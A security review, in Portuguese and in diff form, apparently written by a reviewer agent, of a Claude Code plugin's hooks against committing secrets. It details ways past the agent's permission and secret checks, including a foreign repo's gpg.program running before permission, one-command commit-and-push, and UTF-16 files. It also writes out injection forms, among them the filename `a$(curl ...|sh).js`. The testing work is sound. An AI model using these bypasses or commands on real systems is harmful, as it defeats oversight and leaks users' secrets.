@@ -1,7 +1,7 @@
 # Revisão independente da 0.8.0, parte A (regras dos 2 checklists)
 
-> **Situação atual: pode publicar NÃO** (2ª rodada, 2026-11-02, seção no fim deste arquivo): 1 Bloqueante e 3 Altos abertos.
-> O texto logo abaixo é da 1ª rodada.
+> **Situação atual: pode juntar NÃO** (3ª rodada, 2026-11-02, a última seção deste arquivo): 1 Bloqueante (B-2) e 2 Altos (A-4, A-5)
+> abertos. A 2ª rodada vem antes dela, e o texto logo abaixo é da 1ª rodada.
 
 **Pode publicar: NÃO.** Há 1 achado Alto aberto (A-1): a trava de segredo não vê o caso mais comum de commit de um agente,
 `git add` e `git commit` no mesmo comando. Provado no Claude Code real: o segredo foi para o commit.
@@ -376,3 +376,313 @@ O caso medido na 1ª rodada está resolvido. Os prazos não cobrem operações q
 5. Rode `/checklist-lancamento` num painel de verdade e diga se as perguntas e o relatório fazem sentido no seu dia a dia.
 
 Placar: autor=engenheiro-software cod=sem-codigo veredito=não B=1 A=3 M=2 b=4 ids=B-1,A-1,A-2,A-3,M-1,M-5,b-1,b-6,b-8,b-9
+
+## 3ª rodada (2026-11-02): a trava em 3 barreiras e os lotes 7 a 11
+
+**Pode juntar: NÃO.**
+- **Bloqueante B-2:** a trava roda programa da configuração de um repositório de **outra pasta** citada no comando. No Claude Code
+  real, com a ferramenta negada, o programa rodou antes da permissão. É a mesma classe do B-1 por outro caminho: o B-1 em si (texto do
+  comando) está fechado.
+- **Alto A-4:** commit e push no **mesmo comando** levam o segredo ao remoto só com a pergunta genérica de publicar. Isso inclui uma forma
+  da lista "lida com certeza". Também passam, sem nenhuma pergunta, um script que faz commit e push e o `gh repo create --push`.
+- **Alto A-5:** o verificador novo passa o nome do arquivo editado por um shell. No Windows, `%VAR%` no nome é expandido (provado). Em
+  Linux e macOS, `$(...)` no nome rodaria um comando sem a permissão do Bash [HIPÓTESE pelo mecanismo, sem Linux aqui]. A skill
+  `integracoes` ensina essa configuração.
+
+O que o autor afirmou e se sustenta: o texto do comando não é mais executado (16 formas, 0 arquivo criado, com controle positivo);
+`git commit -m "x"` e a forma padrão do Claude Code passam sem pergunta; A-1, A-2, A-3, M-1, b-1, b-6 e b-8 fechados; licença e marcação
+dos 69 guias do strix; nada da Motiva nos commits novos.
+
+- Revisor: `revisor`, código rv87 (manhã de 2026-11-02: bateria às 06h30, fim às 08h15). Autor: `engenheiro-software`, código tr86.
+- Revisado: cópia `git archive` do a13ea41 (HEAD; inclui dbfd0c3, a trava refeita, e 56de65b..097a9fb, os lotes 7 a 11). Comparação: 82458d9.
+- Bateria sem cache, na cópia: **481 ok, 0 falha** (06h30 a 06h54, com a máquina ocupada pelas minhas sondas). O autor citou 475; a
+  diferença são os 6 casos do a13ea41. `validar.js`: 0 erro, 0 aviso. `claude plugin validate`: ok.
+- **A bateria passa com tudo isso aberto:** a tabela das formas não reproduz o fluxo real (M-7).
+- Os testes rodaram em cópias e repositórios do temp. Nada foi executado no repositório do autor além de leitura e do commit deste
+  relatório.
+
+### Passe de veredito (achados da 2ª rodada)
+| Id | Veredito | Prova |
+|---|---|---|
+| B-1 | resolvido | 16 formas de injeção (aspas no caminho, `$()`, crases, `;` no caminho, `-c core.fsmonitor`, `-c diff.external`, filtro e textconv, `GIT_EXTERNAL_DIFF=`, `--exec-path`, PowerShell `& { }` e `$()`, pathspec com atributo) pelos ganchos antes e depois: 0 arquivo criado; o mesmo texto num shell de verdade cria (controle). No `claude -p` (refeito às 08h, depois que o limite de uso voltou), com a ferramenta negada: o `INJETADO.txt` não foi criado. O próprio Claude Code também recusou o comando por erro de leitura do PowerShell. **Outro caminho de execução: B-2** |
+| A-1 | resolvido | As 11 formas da 2ª rodada perguntam ou são lidas (tabela do autor na bateria; `cd` com espaço escapado refeito por mim no fluxo real: pergunta) |
+| A-2 | resolvido | `git commit -m x 2>&1`, `GIT_AUTHOR_NAME=x git commit` e `timeout 60 git commit`, com a chave preparada: bloqueiam |
+| A-3 | resolvido | `configuração.js` e `.env` em `área/`, com `git add -A && git commit`: bloqueiam |
+| M-1 | resolvido | Linha única de 23 MB com `Host=a;`: pergunta em 7,4 s (era 12 s, e o segredo entrava). Prazo forçado de 1 ms: o antes pergunta e o depois avisa "não deu para conferir". A leitura lenta do antivírus não se reproduz sob demanda; o mecanismo é o do prazo forçado |
+| M-5 | **não verificado** | Os 6 casos do a13ea41 existem e passam. A mutação parou no 3º mutante (falta de memória, ver "Mutação") |
+| b-1 | resolvido | `aws_secret_access_key = <40>` sem aspas, no formato do arquivo de credenciais: bloqueia; `api_key=` minúsculo: pergunta |
+| b-6 | resolvido | O agente tem o passo 8 com os campos e o S-12; o eval cobra os mesmos campos |
+| b-8 | resolvido | Senha com barra invertida, `localhost.empresa.com` e "localhost" no comentário: bloqueiam. `localhost` de verdade pergunta e `<senha>` passa (controles) |
+| b-9 | resolvido | 10 de 12 casos meus: `windowsHide: false`, opção só em comentário ou em texto, `require(...).exec`, função renomeada, objeto do módulo, parêntese em regex e apóstrofo em comentário são acusados. Escapam 2 bordas sem uso hoje: `import * as cp` (ESM) e método guardado em variável |
+
+### Achados abertos
+| Id | Gravidade | Achado | Dono |
+|---|---|---|---|
+| B-2 | Bloqueante | Ganchos rodam programa da configuração de repositório de outra pasta, antes da permissão | `engenheiro-software` |
+| A-4 | Alto | Commit e push no mesmo comando: a barreira do push lê antes de o commit existir; `gh ... --push` e script não passam por ela | `engenheiro-software` |
+| A-5 | Alto | Verificador passa o nome do arquivo editado por um shell | `engenheiro-software` |
+| M-6 | Médio | Comando que falha não dispara a barreira de depois (`PostToolUseFailure`) | `engenheiro-software` |
+| M-7 | Médio | A tabela das formas mede o depois e o push num fluxo que o Claude Code não usa; a afirmação "todas avisam depois e barram no push" é falsa no fluxo real | `engenheiro-software` |
+| M-8 | Médio | Arquivo em UTF-16 passa pelas 3 barreiras | `engenheiro-software` |
+| M-9 | Médio | 13 de 25 formas comuns sem segredo perguntam | `engenheiro-software`; quais formas entram: usuário |
+| M-10 | Médio | `.env.example` é bloqueado, e o checklist do próprio plugin manda criá-lo | `engenheiro-software` |
+| M-11 | Médio | No 1º push de um projeto com histórico, a barreira do push não termina no prazo e vira a pergunta genérica | `engenheiro-software` |
+| b-10 | Baixo | `com$'mit'` (aspas ANSI-C) não é visto como commit: com pasta em variável, nenhuma pergunta e nenhum aviso | `engenheiro-software` |
+| b-11 | Baixo | `retomar.js` no `SessionEnd`: "Hook cancelled" em 3 de 4 rodadas do `claude -p` com o plugin | `engenheiro-software` |
+| b-12 | Baixo | O depois custa cerca de 0,4 s em todo comando de shell | `engenheiro-software` |
+
+### B-2 · Bloqueante · a configuração de outra pasta roda antes da permissão
+A trava roda `git log -p` na pasta citada por `cd`, `-C`, `pushd` ou `Set-Location`, para ler os commits não enviados. O depois roda
+`git rev-parse` e `git log` nessas pastas em **todo** comando. Esses `git` usam a configuração do repositório daquela pasta. As opções
+de proteção (`core.fsmonitor=false`, `--no-ext-diff`, `--no-textconv`) não cobrem `log.showSignature` com `gpg.program`, que faz o git
+chamar um programa para conferir a assinatura de um commit.
+
+Montei um repositório "baixado" com `log.showSignature=true`, `gpg.program` apontando para um script que grava uma marca, e um commit
+com cabeçalho de assinatura falso.
+
+| Gancho e comando (sessão em outra pasta) | Programa da outra pasta rodou? |
+|---|---|
+| antes, `cd "<X>" && git push` | **sim** |
+| antes, `git -C "<X>" push` | **sim** |
+| antes, `cd "<X>" && git commit -m x` | não: commit em outra pasta só pergunta, sem ler |
+| depois, `cd "<X>" && ls` (comando comum, já aprovado) | **sim** |
+| `core.fsmonitor` com o mesmo script, nas 4 formas | não (a proteção funciona) |
+
+**Prova no Claude Code real** (2.1.302, `claude -p` com haiku, plugin da cópia, os plugins instalados desligados, sem permissão para a
+ferramenta), comando `git -C "<X>" push`:
+- a ferramenta foi negada (`permission_denials`, "publicar é visível a outros...") e o push não rodou;
+- **a marca foi criada**, com os argumentos do git ("--status-fd=1 --verify ...");
+- controle: o mesmo pedido sem o plugin não criou a marca.
+
+**Por que é Bloqueante:** o autor escreveu no CHANGELOG que rodar git em outro repositório antes da permissão "usaria a configuração
+dele (filtros do git executam programa)", e por isso o commit em outra pasta pergunta. O push e o depois fazem exatamente isso. Uma pasta
+com `.git` vinda de fora (zip ou pasta compartilhada) roda o que quiser quando o agente só cita a pasta. Sem o plugin (controle), a marca não
+foi criada. A lista de chaves que rodam programa é aberta (`gpg.ssh.program`, `gpg.x509.program`, `trace2.*` grava arquivo),
+então acrescentar `-c log.showSignature=false` fecha este caso e não fecha a classe.
+
+**Correção sugerida:** git só na pasta da sessão e nas subpastas dela. Fora dela, o antes e o push perguntam **sem ler** e dizem "não
+conferido: pasta fora da sessão"; o depois não roda git lá. Caso que prova: o mesmo repositório com a marca, nos 3 caminhos.
+
+### A-4 · Alto · commit e push no mesmo comando
+A barreira do push lê os commits não enviados **antes** de o comando rodar. Se o mesmo comando cria o commit, a leitura não o vê.
+Remoto local (repositório nu no temp), o comando rodado de verdade:
+
+| Comando | Pergunta antes | Remoto | Depois |
+|---|---|---|---|
+| `echo '<chave>' >> a.js && git commit -am x && git push` (forma "simples") | só "publicar é visível a outros" | **segredo no remoto** | "Desfaça ANTES do push" |
+| `git ci -am x && git push` (alias que já existia) | só "publicar" | **segredo no remoto** | idem |
+| `sh salvar.sh && git push` (script com o commit) | só "publicar" | **segredo no remoto** | idem |
+| `eval "git add -A && git commit ..." && git push` | genérica + "publicar" | **segredo no remoto** | idem |
+| `sh deploy.sh` (script com commit e push) | **nenhuma** | **segredo no remoto** | idem |
+| `gh repo create teste --private --source=. --push` | **nenhuma** (só a decisão da trava; não rodei) | - | - |
+
+- **A 1ª linha é da lista "lida com certeza".** O leitor trata `echo ... > arquivo` como leitura, então não vê que o comando escreve o
+  arquivo que o commit vai levar. Sem push no mesmo comando, só o depois pega (`printf > novo.js`, `echo > .env`: avisa).
+- O limite declarado ("script, alias e palavra montada são vistos depois e no push") só vale quando o push é outro comando.
+- O aviso de depois manda "Desfaça ANTES do push" e "Não publique" quando já foi publicado.
+- `gh repo create --push` não tem a palavra `git`, então não passa nem pela pergunta de publicar, que o plugin manda fazer sempre.
+
+**Correção sugerida:** push no mesmo comando de qualquer forma que não seja "simples" bloqueia, com a instrução de separar o commit e o
+push. Redirecionamento com destino de arquivo, antes de um commit, deixa a forma incerta. `gh ... --push` e `gh repo create` entram na
+barreira. O depois confere se o commit já está num remoto e, se estiver, diz "já publicado: troque o segredo".
+
+### A-5 · Alto · verificador passa o nome do arquivo por um shell
+`hooks/verificador.js` monta `comando.replace('{arquivo}', '"' + rel + '"')` e roda com `shell: true`. O nome vem do `file_path` da
+ferramenta Write ou Edit.
+- **Provado no Windows:** com o arquivo `x%USERNAME%.js`, o verificador recebeu `x18-112089.js`. O nome passa pelo `cmd.exe`, e o
+  verificador confere o arquivo errado.
+- **Em Linux e macOS** [HIPÓTESE, sem Linux nesta máquina]: o Node usa `/bin/sh -c`, e aspas duplas não impedem `$(...)` nem crases.
+  Um arquivo `a$(curl ...|sh).js`, criado pela ferramenta Write, rodaria o comando sem passar pela permissão do Bash. Esse é o caminho de
+  quem consegue injetar um pedido.
+- Só vale com `verificador.comando` configurado com `{arquivo}`. É exatamente o que a skill `integracoes` ensina para o detector de
+  interface. É a mesma lição do B-1, registrada em `APRENDIZADOS.md`.
+
+**Correção sugerida:** comando em lista (`["node", "detector.js", "{arquivo}"]`), rodado com `execFile`, sem shell, e o nome como
+argumento. Caso que prova: um nome com `%VAR%` (Windows) e com `$(...)` (onde houver sh) chega literal.
+
+### M-6 · Médio · comando que falha não passa pela barreira de depois
+Sonda no Claude Code 2.1.302, com um plugin que só registra eventos: `echo um` gerou `PostToolUse`; `echo dois; exit 3` gerou
+**`PostToolUseFailure`**, e não `PostToolUse`. O `hooks.json` só liga o `trava-depois.js` no `PostToolUse`. Todo comando que faz o commit
+e depois falha (`... && npm test` vermelho, `... && git push` sem remoto, script que sai com erro) fica sem o aviso. O push separado
+ainda barra, se for no repositório da sessão.
+
+**Correção sugerida:** ligar o mesmo gancho em `PostToolUseFailure`, com um caso que rode um comando que commita e sai 1.
+
+### M-7 · Médio · a tabela das formas não mede o fluxo real
+`scripts/testar-travas-formas.js`:
+- chama o depois com `cwd` = pasta do repositório, também nos casos "de fora", em que o Claude Code manda a pasta da sessão;
+- confere o push com `git push origin main` rodado na pasta do repositório, e não do jeito que o agente chegaria lá;
+- tira `&& git push` do comando antes de rodar, e nenhum caso falha depois do commit.
+
+No fluxo real (sessão em outra pasta, o mesmo comando no depois, o push feito do mesmo jeito que o commit):
+
+| Forma | Antes | Depois | Push |
+|---|---|---|---|
+| `cd /pasta\ com\ espaco && git commit` (é a F5 da tabela) | pergunta | **calado** | **só "publicar"** |
+| `D="<R>"; cd "$D" && git add -A && git commit` | pergunta | **calado** | **só "publicar"** |
+| `D="<R>"; cd "$D" && git com$'mit' -am x` | **passa** | **calado** | **só "publicar"** |
+
+A tabela marca a F5 como "avisa depois e barra no push". A frase do CHANGELOG e do commit dbfd0c3, "todas as 19 avisam depois do comando
+e barram no push", não vale no Claude Code.
+
+**Correção sugerida:** a tabela usa o `cwd` da sessão no depois e no push, roda o push do mesmo jeito que o commit, mantém o `&& git push`
+contra um remoto local e tem um caso que falha depois do commit.
+
+### M-8 · Médio · arquivo em UTF-16 passa pelas 3 barreiras
+O leitor pula conteúdo binário (byte zero nos primeiros 8 KB, ou "Binary files" no diff). UTF-16 tem byte zero a cada letra.
+- `config.ini` em UTF-16LE com a chave, `git add -A && git commit`: antes passa, depois calado, push só "publicar". Em UTF-8 (controle):
+  bloqueia.
+- É o que o Windows PowerShell 5.1 grava com `>` e `>>` sem perfil (a R8 da minha sonda: `echo '<chave>' >> a.js; git commit -am x`
+  deixou a chave em UTF-16 no commit, sem nenhum sinal).
+- Somado ao `gh repo create --push` (A-4), é um caminho **sem nenhuma pergunta e sem aviso**, sem truque no comando.
+
+**Correção sugerida:** BOM de UTF-16 (FF FE ou FE FF), ou byte zero alternado, decodifica como UTF-16 antes das regras. Caso que prova:
+o mesmo arquivo nas 3 barreiras.
+
+### M-9 · Médio · pergunta demais em formas comuns sem segredo
+25 formas comuns, sem segredo, rodadas de verdade (todas fazem o commit): **11 passam, 13 perguntam e 1 bloqueia**.
+
+- Passam:
+  - `git commit -m "x"` e `git commit -m "fix(api): ajusta"`;
+  - a forma padrão do Claude Code (`git add a.js && git commit -m "$(cat <<'EOF' ...)"`);
+  - `cd "C:\..."` e `git -C "C:\..."`;
+  - `| head`;
+  - nome com espaço entre aspas;
+  - no PowerShell: `git commit -am "x"`, here-string, `; if ($?) { }` e `2>&1 | Select-Object`.
+- Perguntam, com o motivo:
+  - "R$5" na mensagem (expansão);
+  - `--trailer`;
+  - `git rm` e `git mv` antes do commit;
+  - `checkout -b` e `switch -c`;
+  - `npm test && git commit` (no teste, `node -e`);
+  - `commit -S`;
+  - sessão na pasta-mãe, com `cd app &&` e com `git -C app`;
+  - no PowerShell: caminho com barra invertida sem aspas (`git add src\b.js;`, `cd C:\...;`) e `| Out-Null`.
+
+No PowerShell, a barra invertida é a forma normal de caminho no Windows, não escape. Pergunta frequente ensina a responder "sim" sem
+ler. **Sugestão:** `rm`, `mv`, `checkout -b` e `switch -c` na lista; barra invertida literal no PowerShell; `Out-Null` como leitura; `$`
+seguido de dígito não é expansão.
+
+### M-10 · Médio · `.env.example` é bloqueado
+`git add .env.example && git commit` com `API_URL=` e `API_KEY=` vazios: **bloqueia**, com "ponha o padrão no .gitignore". O
+`/checklist-lancamento` (itens.md, linha 21; `seguranca-segredos.md`, linhas 41, 56 e 60) e `conhecimento/seguranca/lista.md` mandam ter
+o `.env.example` no git, com marcadores. O agente que segue o checklist é barrado e recebe o conselho contrário. O nome entra pela regra
+`(^|/)\.env(\..*)?$`.
+
+**Correção sugerida:** `.env.example`, `.sample`, `.template` e `.dist` saem da regra de nome. O conteúdo continua lido: valor real
+bloqueia.
+
+### M-11 · Médio · 1º push de projeto com histórico vira pergunta genérica
+O repositório do MVP (sem remoto, 196 commits, 20,8 MB de diff) leva 9,8 s só para o `git log -p` dos não enviados. A barreira do push
+vence o prazo de 7 s **sempre** (7,5 s, 3 de 3) e pergunta "não deu para conferir". O 1º push de um projeto, o que publica tudo, é
+justamente quando a barreira não lê. Com `git add -A && git commit` no mesmo repositório, o antes leva 5,3 s de mediana e 7,8 s de máximo:
+perto do prazo.
+
+**Sugestão:** o depois guarda os commits que já conferiu limpos, e o push lê só os que não conferiu. Para o 1º push, um comando sem prazo
+que o usuário roda uma vez (por exemplo, o `/checklist-lancamento`).
+
+### Baixos
+- **b-10:** `git com$'mit' -am x` (aspas ANSI-C do bash) e `com$"mit"`. O `plano` tira as aspas e deixa o `$`, então "commit" não aparece.
+  - Na pasta da sessão: antes passa, depois avisa e o push barra.
+  - Com a pasta em variável: nada pergunta e nada avisa (tabela da M-7).
+  - Exige truque no comando, por isso Baixo. **Sugestão:** tirar também `$` antes de aspas.
+- **b-11:** em 3 de 4 rodadas do `claude -p` com o plugin, o Claude Code registrou "SessionEnd hook [retomar.js] failed: Hook cancelled", até com
+  `AGENTES_ULTIMATE_SEM_PASTA=1`, quando o gancho sai na hora. Na sessão interativa não verifiquei. Se lá também for cancelado, o
+  rascunho de retomar só sai no PreCompact.
+- **b-12:** o depois roda 2 `git` em todo comando de shell (mediana 411 ms; 204 ms são de abrir o `node`). **Sugestão:** ler `.git/HEAD` e a ref com `fs` e só chamar o git quando o HEAD mudou. Isso também ajuda no B-2.
+
+### As prioridades do pedido
+- **(a) B-1 fechado?** O texto do comando, sim: 16 formas sem execução, com controle positivo. A configuração da pasta citada, não: B-2.
+  - Não confirmado: um `git.exe` plantado na pasta (o Node 24 rodou o git do PATH, não o da pasta, na minha sonda);
+  - não confirmado: `core.fsmonitor` (a proteção funciona).
+- **(b) Forma com segredo que passa pelas 3 barreiras sem pergunta e sem aviso?**
+  - Sim, sem truque: arquivo em UTF-16 com `gh repo create --push` (M-8 com A-4).
+  - Com truque: `com$'mit'` com a pasta em variável (b-10).
+  - Sem pergunta sobre o segredo, com o segredo no remoto: commit e push no mesmo comando (A-4).
+- **(c) `git commit -m "x"` simples:** não pergunta, na pasta da sessão, no Git Bash e no PowerShell. A forma padrão do Claude Code também
+  não. Mas 13 de 25 formas comuns perguntam (M-9) e o `.env.example` bloqueia (M-10).
+- **(d) Lentidão e janela:** tempos abaixo. Nenhuma chamada nova sem `windowsHide` (`validar.js` 0 erro, detector conferido em b-9). O
+  verificador com `shell: true` também esconde a janela.
+- **(e) Licença e Motiva:**
+  - os 69 guias do strix têm, na 1ª linha, a origem, o commit 6b7ae2e, "© 2025 OmniSecure Inc., Apache-2.0", a lista de alterações e
+    "alterado por agentes-ultimate" (conferi os 69);
+  - o `LICENSE` está em `terceiros/usestrix-strix/`, e o `CREDITOS.md` e o `fontes.json` têm o registro;
+  - **não verificado:** se o strix tem um arquivo `NOTICE` (Apache §4d manda copiar). Esta máquina não tem rede para o GitHub, e o
+    inventário não registra;
+  - Motiva, CFO, caminhos e e-mails do usuário: 0 nos commits 56de65b..a13ea41. As menções antigas (`plano-0.7.md`, revisões e nome de
+    teste) continuam como na 2ª rodada.
+- **(f) As 2 decisões:** abaixo.
+
+### Tempos dos ganchos
+Mediana de 5, intercalada com um `node` vazio. As linhas sem nota foram medidas com a máquina livre; as do MVP, com a máquina ocupada pela bateria.
+
+| Gancho e caso | Mediana | `node` vazio |
+|---|---|---|
+| antes (`travas.js`), comando sem git | 303 ms | 253 ms |
+| antes, `git commit -m x`, repositório pequeno | 776 ms | 210 ms |
+| antes, `git commit -m x`, repositório do MVP (OneDrive), máquina ocupada | 1,8 s | 0,4 s |
+| antes, `git add -A && git commit -m x`, MVP, máquina ocupada | 5,3 s (máx. 7,8 s) | 0,4 s |
+| antes, push no MVP, máquina ocupada | 7,5 s: vence o prazo (M-11) | 0,4 s |
+| depois (`trava-depois.js`), comando comum | 411 ms | 204 ms |
+| depois, comando comum no MVP, máquina ocupada | 531 ms | 302 ms |
+| depois, HEAD mudou (lê o commit num filho) | 975 ms | - |
+| depois, comando com 10 `cd` literais | 1,7 s | 191 ms |
+| `retomar.js` no PreCompact, atividade com 0, 2 mil e 20 mil linhas | 411, 406 e 388 ms | cerca de 200 ms |
+| `atividade.js`, Read e Edit, sem verificador | 224 e 218 ms | cerca de 200 ms |
+| `atividade.js`, Edit com verificador (`node` vazio) | 496 ms | 187 ms |
+| `atividade.js`, Stop com `aoParar` (`node` vazio) | 502 ms | 205 ms |
+
+- **Todo comando de shell** agora paga o antes (cerca de 0,3 s) e o depois (cerca de 0,4 s). O `retomar.js` e a sugestão de compactar
+  custam só o `node`, e o `retomar.js` não cresce com a atividade (lê o fim, 128 KB). O depois soma cerca de 80 s em 200 comandos (b-12).
+- O verificador só custa quando está configurado. O `Stop` espera o `aoParar` até 30 s a cada fim de resposta.
+
+### Mutação nas partes alteradas
+**Interrompida, placar parcial: pegou 2 de 2 rodados.**
+- Rodei uma cópia nova por mutante, com troca de texto que falha se o trecho não for achado, e o `scripts/testar-travas.js` sem a tabela
+  longa.
+- O controle sem mutação deu só a falha esperada: o caso b-4, porque o meu executor roda com `AGENTES_ULTIMATE_SEM_PASTA=1`.
+- T1 (forma incerta com commit não pergunta): pego por 11 casos.
+- T2 (as aspas não são tiradas da palavra): pego por 1 caso.
+- O 3º mutante (pasta da sessão sempre "dentro") não terminou em 50 min. Às 08h o Claude Code parou o processo por falta de memória
+  (1,4 GB livres de 7,7 GB). Por ordem, não reiniciei.
+- Ficaram sem rodar 13 mutantes, prontos em `mutar.js` no scratchpad:
+  - `$` fora de aspas e `git add` em outra pasta;
+  - `xargs` na lista de leitura;
+  - `core.quotepath` e `--branches` no push;
+  - teto e arquivo que não abre;
+  - recência e 50 commits no depois;
+  - `--no-textconv` e `log.showroot`;
+  - depois só com alta certeza.
+- O "36 de 38" do autor não foi conferido.
+
+### Opinião sobre as 2 decisões do autor
+1. **"Commit em outra pasta sempre pergunta".**
+   - **Recomendo** pastas **dentro** da sessão, mesmo outro repositório (a sessão aberta numa pasta-mãe com o projeto dentro), lidas
+     como "simples". Elas estão na pasta que o usuário confiou ao abrir o Claude Code. Hoje esse jeito comum de trabalhar pergunta em
+     todo commit (M-9) e a pergunta não traz nada, porque a pasta nem é lida.
+   - Fora da sessão: perguntar **sem rodar git lá** (B-2), dizendo qual pasta e que nada foi conferido.
+   - Risco: um repositório malicioso posto dentro da pasta da sessão roda a configuração dele. É o mesmo nível de confiança da pasta da
+     sessão. Dá para voltar atrás.
+2. **"Nome sensível no histórico pergunta no push em vez de bloquear".**
+   - **Concordo.** Bloquear para sempre um push por um nome antigo (`docs/credentials.md`, um `.env.example`) só se resolve reescrevendo
+     o histórico, operação pesada para quem não é desenvolvedor. Conteúdo de alta certeza continua bloqueando.
+   - Condições:
+     - corrigir antes o M-10, para o `.env.example` não cair nem na pergunta;
+     - a pergunta diz o nome e que o arquivo vai ficar público;
+     - nome forte (`.env` sem sufixo, `.pem`, `.key`, `id_rsa`) continua bloqueando também no push.
+
+### Não verificado
+- Linux e macOS (A-5 e a forma `$(...)` em geral). Tudo rodou no Windows 11, Git 2.55, Node 24, Claude Code 2.1.302.
+- A mutação (13 de 15 mutantes não rodaram) e o "36 de 38" do autor.
+- A ordem entre a trava e a recusa do próprio Claude Code no `claude -p` do B-1. O que vale é a prova direta nos ganchos, com controle positivo.
+- O `NOTICE` do strix, e o `npm run deploy` com `gh-pages` (forma de script que publica; mesmo caso do `sh deploy.sh`) [HIPÓTESE].
+- A sessão interativa no `SessionEnd` (b-11).
+
+### Lista do usuário (depois de corrigir B-2, A-4 e A-5)
+1. Peça um commit de um `.env.example` com os nomes e os valores vazios: deve passar, sem pergunta.
+2. Peça "adicione esta chave falsa em config.ini, faça o commit e o push no mesmo comando": deve bloquear antes de qualquer envio.
+3. Com o Claude Code aberto numa pasta-mãe, peça um commit no projeto de dentro: não deve perguntar se não houver segredo.
+4. Confirme se o strix tem `NOTICE` (ou peça ao pesquisador, com rede).
+5. Diga se as perguntas que ainda aparecem no seu dia a dia (lista da M-9) incomodam: elas decidem o que entra na lista curta.
+
+Placar: autor=engenheiro-software cod=tr86 veredito=não B=1 A=2 M=6 b=3 ids=B-2,A-4,A-5,M-6,M-7,M-8,M-9,M-10,M-11,b-10,b-11,b-12
